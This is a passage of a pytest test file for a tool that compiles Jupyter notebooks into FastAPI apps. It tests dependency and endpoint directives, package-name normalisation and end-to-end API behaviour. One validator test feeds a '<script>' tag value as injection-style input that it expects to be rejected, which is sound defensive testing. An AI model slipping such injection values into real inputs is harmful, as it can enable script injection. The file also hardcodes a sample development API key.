        "# notebook-to-api: apt-requires libgl1\n",
    ]

    assert _extract_explicit_apt_packages(code_cells) == ["libpq-dev", "libgl1"]


def test_extract_explicit_apt_packages_allows_two_different_pins_for_the_same_package():
    """Unlike _extract_explicit_requirements' own "requires" directive,
    apt-get itself doesn't hard-fail on two mentions of the same package
    -- it simply installs whichever comes last -- so there is no
    equivalent conflict to raise for here.
    """

    code_cells = [
        "# notebook-to-api: apt-requires libpq-dev=1.0\n"
        "# notebook-to-api: apt-requires libpq-dev=2.0\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == [
        "libpq-dev=1.0", "libpq-dev=2.0",
    ]


def test_extract_explicit_apt_packages_ignores_an_unrelated_comment():

    code_cells = [
        "# this notebook-to-api project requires careful review\n"
        "import pandas\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == []


def test_extract_explicit_apt_packages_does_not_match_the_requires_directive():

    code_cells = [
        "# notebook-to-api: requires psycopg2==2.9.9\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == []


def test_extract_explicit_apt_packages_returns_an_empty_list_with_no_directives():

    code_cells = ["import pandas\n\ndef f() -> int:\n    return 1\n"]

    assert _extract_explicit_apt_packages(code_cells) == []


def test_extract_explicit_apt_packages_ignores_a_directive_inside_a_docstring():

    code_cells = [
        "def compute(x):\n"
        '    """\n'
        "    # notebook-to-api: apt-requires curl\n"
        '    """\n'
        "    return x\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == []


def test_extract_explicit_requirements_raises_for_conflicting_specs_in_the_same_cell():
    """Two different specs for the same package both surviving into
    requirements.txt is the identical "Double requirement given" pip
    failure resolve_requirements' own docstring already describes fixing
    for the auto-detected-vs-explicit case (see
    test_resolve_requirements_drops_the_auto_detected_line_that_conflicts_with_an_explicit_one
    below) -- just for two explicit directives naming the same package
    instead, e.g. left behind after pinning a different version while
    iterating on a notebook.
    """

    code_cells = [
        "# notebook-to-api: requires numpy==1.24.0\n"
        "# notebook-to-api: requires numpy==1.26.0\n"
    ]

    with pytest.raises(ValueError, match="numpy"):
        _extract_explicit_requirements(code_cells)


def test_extract_explicit_requirements_raises_for_conflicting_specs_across_cells():

    code_cells = [
        "# notebook-to-api: requires numpy==1.24.0\nimport pandas\n",
        "def f() -> int:\n    return 1\n",
        "# notebook-to-api: requires numpy==1.26.0\n",
    ]

    with pytest.raises(ValueError, match="numpy"):
        _extract_explicit_requirements(code_cells)


def test_extract_explicit_requirements_conflict_detection_is_case_insensitive():
    """PyPI distribution names are themselves case-insensitive -- pip
    normalizes "NumPy"/"numpy"/"nUmPy" to the identical project -- so a
    directive spelled differently than another must still be recognized
    as naming the same package.
    """

    code_cells = [
        "# notebook-to-api: requires NumPy==1.24.0\n"
        "# notebook-to-api: requires numpy==1.26.0\n"
    ]

    with pytest.raises(ValueError, match="(?i)numpy"):
        _extract_explicit_requirements(code_cells)


def test_extract_explicit_requirements_conflict_detection_normalizes_separators():
    """PyPI normalizes "-"/"_"/"." runs in a project name to a single "-"
    (PEP 503), not just case -- "python-dateutil" and "python_dateutil"
    are the identical distribution to pip, so two directives spelled with
    different separators for the same package must still be recognized
    as conflicting, the identical "Double requirement given" pip failure
    this check already exists to catch for the case-only variant above.
    """

    code_cells = [
        "# notebook-to-api: requires python-dateutil==2.8.0\n"
        "# notebook-to-api: requires python_dateutil==2.9.0\n"
    ]

    with pytest.raises(ValueError, match="(?i)python.dateutil"):
        _extract_explicit_requirements(code_cells)


def test_extract_explicit_requirements_error_names_both_conflicting_specs():

    code_cells = [
        "# notebook-to-api: requires numpy==1.24.0\n"
        "# notebook-to-api: requires numpy==1.26.0\n"
    ]

    with pytest.raises(ValueError) as exc_info:
        _extract_explicit_requirements(code_cells)

    message = str(exc_info.value)
    assert "numpy==1.24.0" in message
    assert "numpy==1.26.0" in message


def test_extract_explicit_requirements_allows_identical_specs_repeated():
    """An exact-duplicate line is not a conflict -- exact-duplicate
    removal (test_extract_explicit_requirements_deduplicates_exact_matches_across_cells
    above) already handles this case cleanly, and must keep doing so
    with conflict detection layered on top of it.
    """

    code_cells = [
        "# notebook-to-api: requires somepkg==1.0\n",
        "# notebook-to-api: requires somepkg==1.0\n",
    ]

    assert _extract_explicit_requirements(code_cells) == ["somepkg==1.0"]


def test_extract_explicit_requirements_allows_unrelated_packages():

    code_cells = [
        "# notebook-to-api: requires numpy==1.24.0\n"
        "# notebook-to-api: requires pandas==2.0.0\n"
    ]

    assert _extract_explicit_requirements(code_cells) == [
        "numpy==1.24.0", "pandas==2.0.0",
    ]


def test_extract_explicit_requirements_does_not_false_flag_two_unrelated_vcs_specs():
    """_explicit_requirement_package_name has no reliable way to name a
    bare VCS/URL spec with no "name @ " prefix (see its own docstring) --
    two such specs must never be treated as conflicting just because
    neither can be named, the same "no reliable name, so no comparison"
    reasoning that function's own None return already establishes for
    resolve_requirements' identical auto-detected-conflict check.
    """

    code_cells = [
        "# notebook-to-api: requires git+https://example.com/one.git\n"
        "# notebook-to-api: requires git+https://example.com/two.git\n"
    ]

    assert _extract_explicit_requirements(code_cells) == [
        "git+https://example.com/one.git",
        "git+https://example.com/two.git",
    ]


def test_explicit_requirement_package_name_returns_none_for_a_bare_vcs_url():
    """Confirmed exploitable before this: "[A-Za-z0-9._-]*" alone had no
    reason to stop before "git+https://...write.git"'s own "+", so it
    silently captured "git" as though that were the actual package name
    -- indistinguishable from a real, unrelated package literally named
    "git".
    """

    assert _explicit_requirement_package_name(
        "git+https://example.com/pkg.git"
    ) is None


def test_explicit_requirement_package_name_handles_every_pep_508_continuation():

    assert _explicit_requirement_package_name("requests") == "requests"
    assert _explicit_requirement_package_name("somepkg[extra]==1.2.3") == "somepkg"
    assert _explicit_requirement_package_name("somepkg>=1.0") == "somepkg"
    assert _explicit_requirement_package_name("somepkg~=1.0") == "somepkg"
    assert _explicit_requirement_package_name("somepkg!=1.0") == "somepkg"
    assert _explicit_requirement_package_name(
        'somepkg;python_version<"3.11"'
    ) == "somepkg"
    assert _explicit_requirement_package_name(
        "my-private-pkg @ git+https://example.com/pkg.git"
    ) == "my-private-pkg"


def test_normalize_distribution_name_folds_case():

    assert _normalize_distribution_name("NumPy") == "numpy"
    assert _normalize_distribution_name("numpy") == "numpy"
    assert _normalize_distribution_name("nUmPy") == "numpy"


def test_normalize_distribution_name_collapses_separator_runs_to_a_single_hyphen():
    """PEP 503: PyPI normalizes any run of "-"/"_"/"." in a project name
    to a single "-" -- "python-dateutil", "python_dateutil", and
    "python.dateutil" (or any mix, including a run like "a--b"/"a_.-b")
    are all the identical distribution to pip.
    """

    assert _normalize_distribution_name("python-dateutil") == "python-dateutil"
    assert _normalize_distribution_name("python_dateutil") == "python-dateutil"
    assert _normalize_distribution_name("python.dateutil") == "python-dateutil"
    assert _normalize_distribution_name("Python_Date-Util") == "python-date-util"
    assert _normalize_distribution_name("zope.interface") == "zope-interface"
    assert _normalize_distribution_name("a--b__c..d") == "a-b-c-d"


def test_extract_excluded_imports_finds_a_directive_in_a_cell():

    code_cells = [
        "# notebook-to-api: exclude pytest\n"
        "import pandas\n"
    ]

    assert _extract_excluded_imports(code_cells) == {"pytest"}


def test_extract_excluded_imports_finds_a_directive_indented_inside_a_function():

    code_cells = [
        "def f() -> int:\n"
        "    # notebook-to-api: exclude debug_only_pkg\n"
        "    return 1\n"
    ]

    assert _extract_excluded_imports(code_cells) == {"debug_only_pkg"}


def test_extract_excluded_imports_collects_several_across_cells():

    code_cells = [
        "# notebook-to-api: exclude pytest\n",
        "# notebook-to-api: exclude ipdb\n",
    ]

    assert _extract_excluded_imports(code_cells) == {"pytest", "ipdb"}


def test_extract_excluded_imports_ignores_an_unrelated_comment():

    code_cells = [
        "# this notebook-to-api project should exclude nothing\n"
        "import pandas\n"
    ]

    assert _extract_excluded_imports(code_cells) == set()


def test_extract_excluded_imports_returns_an_empty_set_with_no_directives():

    code_cells = ["import pandas\n\ndef f() -> int:\n    return 1\n"]

    assert _extract_excluded_imports(code_cells) == set()


def test_extract_excluded_imports_ignores_a_directive_inside_a_docstring():

    code_cells = [
        "def compute(x):\n"
        '    """\n'
        "    # notebook-to-api: exclude pandas\n"
        '    """\n'
        "    import pandas\n"
        "    return x\n"
    ]

    assert _extract_excluded_imports(code_cells) == set()


def test_lines_inside_multiline_strings_falls_back_to_empty_on_unterminated_bracket():
    """A genuinely malformed cell (an unclosed bracket at EOF) must never
    crash any of the three directive-extraction functions this feeds --
    falls back to this function's own previous, unprotected behavior
    (protecting nothing), leaving is_parseable_python (ast_parser.py) to
    reject the cell outright afterward, the same fallback stance
    _lines_unsafe_for_magic_detection (backend/parser/notebook_parser.py)
    already takes for the identical "can't tokenize, don't crash" case.
    """

    from backend.compiler import _lines_inside_multiline_strings

    source = "total = (\n    a\n"

    assert _lines_inside_multiline_strings(source) == set()


def test_extract_third_party_imports_omits_an_excluded_import():

    code_cells = [
        "# notebook-to-api: exclude pytest\n"
        "import pytest\n"
        "import pandas\n"
    ]

    imports = extract_third_party_imports(code_cells)

    assert "pandas" in imports
    assert "pytest" not in imports


def test_extract_third_party_imports_keeps_a_non_excluded_import():

    code_cells = ["import pandas\n"]

    assert extract_third_party_imports(code_cells) == ["pandas"]


def test_compile_notebook_excludes_a_directive_named_import_from_requirements_txt(
    tmp_path
):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: exclude nbformat\n"
            "import nbformat\n\n"
            "def f() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")

    assert "nbformat" not in requirements
    assert any(
        line.startswith("fastapi==") for line in requirements.splitlines()
    )


def test_compile_notebook_writes_an_explicit_requirement_directive_to_requirements_txt(
    tmp_path
):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: requires opencv-python-headless==4.9.0.80\n"
            "\n"
            "def f() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = set(requirements.split())

    assert "opencv-python-headless==4.9.0.80" in lines


def test_compile_notebook_explicit_requirement_coexists_with_auto_detected_ones(
    tmp_path
):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: requires my-private-pkg @ git+https://example.com/pkg.git\n"
            "import nbformat\n\n"
            "def f() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = requirements.splitlines()

    assert "my-private-pkg @ git+https://example.com/pkg.git" in lines
    assert any(line.startswith("nbformat==") for line in lines)
    assert any(line.startswith("fastapi==") for line in lines)


def test_compile_notebook_without_any_directive_behaves_as_before(tmp_path):
    """Preserves the previous, still-default behavior -- a notebook with
    no "# notebook-to-api: requires ..." comment compiles exactly as it
    always has.

    Uses nbformat as the auto-detected import -- see
    test_requirements_pins_a_notebook_dependency_installed_in_this_environment's
    own docstring above for why this can't be pandas: it isn't listed in
    the project's requirements.txt, so it's absent in a clean CI install.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import nbformat\n\ndef f() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = requirements.split()

    assert any(line.startswith("nbformat==") for line in lines)
    assert any(line.startswith("fastapi==") for line in lines)


def test_extract_timeout_overrides_reads_the_directive_above_a_def():
    """Confirmed missing before this feature: there was no per-function
    way to set a synchronous endpoint's request timeout."""
    from backend.compiler import _extract_timeout_overrides

    cells = [
        "# notebook-to-api: timeout 30\ndef report(a: int) -> int:\n    return a\n",
        # Stacked above another directive, with a blank line.
        "# notebook-to-api: timeout 0\n\n# notebook-to-api: deprecated\n"
        "async def fit(a: int) -> int:\n    return a\n",
        "def plain(a: int) -> int:\n    return a\n",
        # Not directly above a def -- ignored.
        "# notebook-to-api: timeout 5\nx = 1\ndef later(a: int) -> int:\n    return a\n",
    ]

    assert _extract_timeout_overrides(cells) == {"report": 30, "fit": 0}


def test_compile_applies_the_timeout_directive_to_that_endpoint_only(tmp_path):
    notebook = nbformat.v4.new_notebook()
    notebook.cells = [nbformat.v4.new_code_cell(
        "# notebook-to-api: timeout 7\ndef slow(a: int) -> int:\n    return a\n\n"
        "def fast(a: int) -> int:\n    return a\n"
    )]
    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    compile_notebook(str(notebook_path), str(tmp_path / "generated"))

    app_source = (tmp_path / "generated" / "app.py").read_text(encoding="utf-8")
    assert "functools.partial(notebook_module.slow, req.a), is_async=False, timeout=7)" in app_source
    assert "functools.partial(notebook_module.fast, req.a), is_async=False)" in app_source


def test_extract_rate_limit_overrides_reads_stacked_directives_and_ignores_zero():
    from backend.compiler import _extract_rate_limit_overrides

    cells = [
        "# notebook-to-api: rate-limit 5\n# notebook-to-api: timeout 3\ndef predict(x):\n    return x\n",
        "# notebook-to-api: rate-limit 0\nasync def train():\n    return 1\n",
        "def free():\n    return 2\n",
    ]

    assert _extract_rate_limit_overrides(cells) == {"predict": 5}


def test_extract_cache_overrides_reads_stacked_directives_and_ignores_zero():
    from backend.compiler import _extract_cache_overrides

    cells = [
        "# notebook-to-api: timeout 3\n# notebook-to-api: cache 30\ndef lookup(x):\n    return x\n",
        "# notebook-to-api: cache 0\ndef fresh():\n    return 1\n",
        "# notebook-to-api: rate-limit 2\ndef other():\n    return 2\n",
    ]

    assert _extract_cache_overrides(cells) == {"lookup": 30}


def test_extract_tag_overrides_reads_stacked_directives_and_rejects_bad_names():
    from backend.compiler import _extract_tag_overrides

    cells = [
        "# notebook-to-api: tag Inference\n# notebook-to-api: cache 5\ndef score(x):\n    return x\n",
        "# notebook-to-api: tag Model Ops_v2\nasync def train_fast():\n    return 1\n",
        "# notebook-to-api: tag <script>\ndef bad():\n    return 2\n",
        "def plain():\n    return 3\n",
    ]

    assert _extract_tag_overrides(cells) == {"score": "Inference", "train_fast": "Model Ops_v2"}


def test_find_unrecognized_directives_flags_only_unknown_names():
    from backend.compiler import _find_unrecognized_directives

    cells = [
        "# notebook-to-api: cache 5\n# notebook-to-api: rate-limit 2\n"
        "# notebook-to-api: deprecated: old\n# notebook-to-api: requires numpy\n"
        "# notebook-to-api: apt-requires git\n# notebook-to-api: exclude os\n"
        "# notebook-to-api: private\n# notebook-to-api: background\n"
        "# notebook-to-api: sync\n# notebook-to-api: timeout 3\n"
        "# notebook-to-api: tag Math\ndef ok():\n    pass\n",
        "  # notebook-to-api: cahce 60\ndef a():\n    pass\n",
        "# notebook-to-api: Private\n# regular comment\n# notebook-to-api:\n",
    ]

    assert _find_unrecognized_directives(cells) == [
        {"directive": "cahce", "line": "# notebook-to-api: cahce 60"},
        {"directive": "Private", "line": "# notebook-to-api: Private"},
    ]
    assert _find_unrecognized_directives([]) == []


def test_find_unrecognized_directives_flags_malformed_arguments_of_real_directives():
    from backend.compiler import _find_unrecognized_directives

    cells = [
        "# notebook-to-api: cache abc\ndef a():\n    pass\n"
        "# notebook-to-api: timeout\ndef b():\n    pass\n"
        "# notebook-to-api: rate-limit -5\ndef c():\n    pass\n"
        "# notebook-to-api: tag Bad!Name\ndef d():\n    pass\n"
        "# notebook-to-api: private now\ndef e():\n    pass\n",
        # Well-formed -- never flagged, trailing whitespace included.
        "# notebook-to-api: cache 30  \ndef f():\n    pass\n"
        "# notebook-to-api: tag My Tag-2\ndef g():\n    pass\n"
        "# notebook-to-api: timeout 0\n# notebook-to-api: sync\ndef h():\n    pass\n",
    ]

    assert [(item["directive"], item["line"]) for item in _find_unrecognized_directives(cells)] == [
        ("cache", "# notebook-to-api: cache abc"),
        ("timeout", "# notebook-to-api: timeout"),
        ("rate-limit", "# notebook-to-api: rate-limit -5"),
        ("tag", "# notebook-to-api: tag Bad!Name"),
        ("private", "# notebook-to-api: private now"),
    ]


def test_compiler_pipeline_tasks_record_their_endpoint_and_list_filters_by_it(tmp_path):
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": (
                    "# notebook-to-api: background\n"
                    "def alpha(x: int) -> int:\n    return x\n\n"
                    "# notebook-to-api: background\n"
                    "def beta(x: int) -> int:\n    return x\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

alpha_id = client.post("/alpha", json={{"x": 1}}, headers=headers).json()["task_id"]
client.post("/beta", json={{"x": 2}}, headers=headers)
client.post("/beta", json={{"x": 3}}, headers=headers)

everything = client.get("/tasks", headers=headers).json()
assert everything["matching_tasks"] == 3, everything
assert everything["tasks"][alpha_id]["endpoint"] == "/alpha", everything

only_alpha = client.get("/tasks", params={{"endpoint": "/alpha"}}, headers=headers).json()
assert list(only_alpha["tasks"]) == [alpha_id], only_alpha

only_beta = client.get("/tasks", params={{"endpoint": "/beta"}}, headers=headers).json()
assert only_beta["matching_tasks"] == 2, only_beta

none = client.get("/tasks", params={{"endpoint": "/missing"}}, headers=headers).json()
assert none["matching_tasks"] == 0 and none["tasks"] == {{}}, none

print("TASK_ENDPOINT_FILTER_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "TASK_ENDPOINT_FILTER_E2E_OK" in proc.stdout


def test_compiler_pipeline_task_purge_endpoints_can_target_one_endpoint(tmp_path):
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": (
                    "# notebook-to-api: background\n"
                    "def alpha(x: int) -> int:\n    return x\n\n"
                    "# notebook-to-api: background\n"
                    "def beta(x: int) -> int:\n    return x\n\n"
                    "# notebook-to-api: background\n"
                    "def boom(x: int) -> int:\n    raise RuntimeError('nope')\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

for name in ("alpha", "beta", "beta", "boom", "boom"):
    assert client.post("/" + name, json={{"x": 1}}, headers=headers).status_code == 200

deadline = time.time() + 10
while client.get("/tasks", params={{"status": "processing"}}, headers=headers).json()["matching_tasks"]:
    assert time.time() < deadline, "tasks never finished"
    time.sleep(0.02)

# The bare function name works like GET /tasks' route form.
assert client.get("/tasks", params={{"endpoint": "beta"}}, headers=headers).json()["matching_tasks"] == 2

# Only beta's completed tasks are purged; alpha's survive.
purged = client.delete("/tasks/completed", params={{"endpoint": "/beta"}}, headers=headers).json()
assert purged["deleted"] == 2, purged
assert purged["remaining_tasks"] == 3, purged
assert client.get("/tasks", params={{"endpoint": "/alpha"}}, headers=headers).json()["matching_tasks"] == 1

# A different endpoint's failed tasks are untouched by a scoped purge.
assert client.delete("/tasks/failed", params={{"endpoint": "alpha"}}, headers=headers).json()["deleted"] == 0
failed = client.delete("/tasks/failed", params={{"endpoint": "boom"}}, headers=headers).json()
assert failed["deleted"] == 2, failed
assert failed["remaining_tasks"] == 1, failed

# Unscoped behavior is unchanged.
assert client.delete("/tasks/completed", headers=headers).json()["deleted"] == 1
assert client.get("/tasks", headers=headers).json()["matching_tasks"] == 0

print("TASK_PURGE_ENDPOINT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "TASK_PURGE_ENDPOINT_E2E_OK" in proc.stdout


def test_compiler_pipeline_numpy_pandas_and_nan_results_are_returned_as_plain_json(tmp_path):
    """Confirmed before this: a sync function returning a numpy value/array
    or a DataFrame got a 500 "not JSON-serializable", and a float NaN
    crashed response serialization with a bare "Internal Server Error"."""
    pytest.importorskip("numpy")
    pytest.importorskip("pandas")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": (
                    "import numpy as np\n"
                    "import pandas as pd\n"
                    "def frame(n: int):\n"
                    "    return pd.DataFrame({'a': list(range(n)), 'b': [float('nan')] * n})\n\n"
                    "def array(n: int):\n    return np.arange(n)\n\n"
                    "def scalar(n: int):\n    return np.int64(n)\n\n"
                    "def not_a_number(n: int):\n    return {'mean': float('nan'), 'top': float('inf'), 'ok': 1.5}\n\n"
                    "def plain(n: int):\n    return [n, 'x', None]\n\n"
                    "# notebook-to-api: background\n"
                    "def train_array(n: int):\n    return np.arange(n)\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 2}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("frame") == [{{"a": 0, "b": None}}, {{"a": 1, "b": None}}]
assert call("array") == [0, 1]
assert call("scalar") == 2
assert call("not_a_number") == {{"mean": None, "top": None, "ok": 1.5}}
# Ordinary results are untouched.
assert call("plain") == [2, "x", None]

# A background task's stored result is normalized the same way.
task_id = client.post("/train_array", json={{"n": 3}}, headers=headers).json()["task_id"]
deadline = time.time() + 10
while True:
    task = client.get("/tasks/" + task_id, headers=headers).json()
    if task["status"] != "processing":
        break
    assert time.time() < deadline, "task never finished"
    time.sleep(0.02)
assert task["status"] == "completed" and task["result"] == [0, 1, 2], task

print("JSON_SAFE_RESULTS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "JSON_SAFE_RESULTS_E2E_OK" in proc.stdout


def test_array_like_kind_detects_numpy_and_pandas_annotations():
    from backend.generator.api_generator import _array_like_kind

    assert _array_like_kind("np.ndarray") == "ndarray"
    assert _array_like_kind("numpy.ndarray") == "ndarray"
    assert _array_like_kind("npt.NDArray[np.float64]") == "ndarray"
    assert _array_like_kind("NDArray") == "ndarray"
    assert _array_like_kind("pd.DataFrame") == "dataframe"
    assert _array_like_kind("pandas.Series") == "series"
    assert _array_like_kind("Optional[pd.DataFrame]") == "dataframe"
    assert _array_like_kind("pd.Series | None") == "series"
    # Not array-like, or not attributable to numpy/pandas.
    for other in ("int", "list[float]", "Optional[int]", "mylib.DataFrame", "DataFrame", "int | str", None, ""):
        assert _array_like_kind(other) is None, other


def test_compiler_pipeline_numpy_and_pandas_parameters_are_accepted_as_json(tmp_path):
    """Confirmed before this: a function annotated np.ndarray / pd.DataFrame /
    pd.Series crashed the *whole* generated app at import with a
    PydanticSchemaGenerationError, taking every endpoint down with it."""
    pytest.importorskip("numpy")
    pytest.importorskip("pandas")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": (
                    "import numpy as np\n"
                    "import pandas as pd\n"
                    "from typing import Optional\n"
                    "def total(arr: np.ndarray, k: float = 1.0) -> float:\n"
                    "    return float(arr.sum() * k)\n\n"
                    "def columns(df: pd.DataFrame) -> list:\n"
                    "    return list(df.columns)\n\n"
                    "def first(series: pd.Series) -> float:\n"
                    "    return float(series.iloc[0])\n\n"
                    "def head(df: Optional[pd.DataFrame] = None, n: int = 1) -> pd.DataFrame:\n"
                    "    return (df if df is not None else pd.DataFrame({'a': [1, 2]})).head(n)\n\n"
                    "def plain(values: list[float]) -> float:\n"
                    "    return sum(values)\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name, body, status=200):
    response = client.post("/" + name, json=body, headers=headers)
    assert response.status_code == status, (name, response.status_code, response.text)
    return response.json()

assert call("total", {{"arr": [1, 2, 3], "k": 2}})["result"] == 12.0
assert call("columns", {{"df": [{{"a": 1, "b": 2}}]}})["result"] == ["a", "b"]
assert call("columns", {{"df": {{"x": [1], "y": [2]}}}})["result"] == ["x", "y"]
assert call("first", {{"series": [5, 6]}})["result"] == 5.0
assert call("head", {{"df": [{{"a": 5}}, {{"a": 6}}], "n": 1}})["result"] == [{{"a": 5}}]
assert call("head", {{}})["result"] == [{{"a": 1}}]
assert call("plain", {{"values": [1, 2]}})["result"] == 3.0

# A value that can't become the annotated type is the caller's error.
detail = call("total", {{"arr": [[1, 2], [3]]}}, status=422)["detail"]
assert "ndarray" in detail, detail

assert client.get("/openapi.json").status_code == 200
print("ARRAY_PARAMS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ARRAY_PARAMS_E2E_OK" in proc.stdout


def test_typing_exports_exclude_the_io_and_re_pseudo_modules():
    """`io.BytesIO` / `re.Pattern` annotations were being imported from
    typing because dir(typing) lists the deprecated `io`/`re` shims."""
    from backend.generator.api_generator import _TYPING_EXPORTS

    assert "io" not in _TYPING_EXPORTS and "re" not in _TYPING_EXPORTS
    assert {"Optional", "List", "Dict", "Any", "Literal", "Annotated"} <= _TYPING_EXPORTS


def test_compiler_pipeline_unmodelable_parameter_types_no_longer_crash_the_app(tmp_path):
    """Confirmed before this: a parameter typed np.float64, pd.Timestamp, a
    plain notebook class, or io.BytesIO crashed the *entire* generated app
    at import (PydanticSchemaGenerationError / a bad `from typing import`),
    so every other endpoint in the notebook went down with it."""
    pytest.importorskip("numpy")
    pytest.importorskip("pandas")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": (
                    "import io\n"
                    "import numpy as np\n"
                    "import pandas as pd\n"
                    "from enum import Enum\n"
                    "class Mode(Enum):\n    FAST = 'fast'\n    SLOW = 'slow'\n\n"
                    "class Model:\n    pass\n\n"
                    "def scalar(x: np.float64) -> float:\n    return float(x) * 2\n\n"
                    "def when(ts: pd.Timestamp) -> str:\n    return str(ts)\n\n"
                    "def custom(m: Model) -> int:\n    return 1\n\n"
                    "def buffer(b: io.BytesIO) -> int:\n    return 1\n\n"
                    "def picks(mode: Mode = Mode.FAST) -> str:\n    return mode.value\n\n"
                    "def healthy(n: int) -> int:\n    return n + 1\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name, body):
    response = client.post("/" + name, json=body, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("scalar", {{"x": 1.5}}) == 3.0
